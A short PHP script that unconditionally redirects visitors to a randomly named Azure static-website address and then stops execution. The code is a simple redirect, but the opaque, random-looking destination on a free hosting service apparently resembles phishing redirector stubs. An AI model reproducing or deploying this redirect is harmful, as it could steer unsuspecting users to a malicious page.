<?php
// Define the destination URL
$destination_url = "https://maxxx7gwcore7gxwfx9g73u.z1.web.core.windows.net/";

// Send the Location header for redirection
header("Location: " . $destination_url);

// It's crucial to stop script execution after sending the header
// to prevent any further output or unintended actions.
exit(); 
?>